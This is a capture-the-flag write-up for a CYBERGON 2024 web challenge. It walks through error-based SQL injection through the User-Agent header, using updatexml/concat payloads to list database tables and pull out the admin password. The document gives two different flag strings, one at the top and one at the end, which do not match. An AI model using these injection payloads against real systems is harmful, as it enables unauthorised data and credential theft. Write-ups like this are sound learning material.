# Description
Agents can register and login, but can you figure out the flag? Flag Format: CYBERGON_CTF2024{xxx}


# Flag
CYBERGON_CTF2024{N0w_Ag3nt_PwN3d_Th3_S3rv3r}


# Analysis
Visiting the website you will get this index page:

![image](https://github.com/user-attachments/assets/39b2c3e3-0c60-4b51-bb76-5644e0e60794)


You only have 2 options to either login or register, one thing to note is you cant register with a username that already exists. I always test for this at the start to see if the user admin exists within the database and it does for this challenge:
![image](https://github.com/user-attachments/assets/67845949-73ed-45dc-b9a1-ab0e79b2243e)


Once you login successfully you can access a log page, on this log page it prints your user agent and public ip address:

![image](https://github.com/user-attachments/assets/6868eb25-a7fd-45f7-9acd-4a8e4a52ee09)


Based on what's being printed and the challenge name I assumed it was something to do with the User-Agent Header in the request so I did some searching. After awhile I stumbled upon this ctf challenge writeup with the almost [exact same problem](https://ctftime.org/writeup/24894)  . Reading through it you can understand how this injection works. Basically it submits a query with the intention of getting an error message regarding the XPath and you can manipulate the error message to print the data you intend to extract.
![image](https://github.com/user-attachments/assets/9f9a8a40-d6d1-4338-9cc4-1b2b49e2270e)

# Solution
To test I tried the first query:
![image](https://github.com/user-attachments/assets/babb9a55-a3a0-4342-ad92-33af9df85e36)


but as you can see it didn't give the expected output this is because we are trying to insert 3 values into a table that only has 2 columns so a maximum of only 2 values can be taken in. To fix this just simply remove the admin from the query:
![image](https://github.com/user-attachments/assets/7697b3a6-62ac-426f-9747-fae5efd82c72)


Now we get the correct error message, so we know the database is called ctf. With this knowledge we can search within this database now for the tables that exist within it and their names using this query:
`'or updatexml(0, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='ctf' LIMIT 1)), 0) or '', '127.0.0.1') #`

This query selects the first table and its name from the ctf database and displays it because there cannot be more than one printed value in the error message we have to extract the names 1 by 1.
![image](https://github.com/user-attachments/assets/7e848917-3eb3-464c-bdf6-6983c4260f85)


We get this result but this is not what we want we need to know what is the table name that houses user data to acquire the admin password to login as admin, to get our desired table name we can modify the query like so:
`'or updatexml(0, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='ctf' LIMIT 1 OFFSET 1)), 0) or '', '127.0.0.1') #`

![image](https://github.com/user-attachments/assets/c0c1b9f5-38be-44d0-af6e-807fd6db4b04)


Nice it worked, with this we can now query the users table for the user which has username=admin and get its password with this query:
`'or updatexml(0, concat(0x7e, (SELECT password FROM users WHERE username='admin' LIMIT 1)), 0) or '', '127.0.0.1') #`

![image](https://github.com/user-attachments/assets/2236dade-fb4e-4afd-8d7e-56b94d5d43ef)


The admin password seems to be the flag but it's not printing out the entire flag message, we can change our query to something like this to print out the latter half that we currently can't see:
`'or updatexml(0, concat(0x7e, (SELECT substring(password, 25, 40) FROM users WHERE username='admin' LIMIT 1)), 0) or '', '127.0.0.1') #`
![image](https://github.com/user-attachments/assets/bc0bc020-f24d-4042-bddc-dd38dc6ad534)


With that we have the rest of the flag, challenge solved!


CYBERGON_CTF2024{doorstops.overthrows.folder_4_Gautama_Kakusandha_Kassapa_Konagamana}

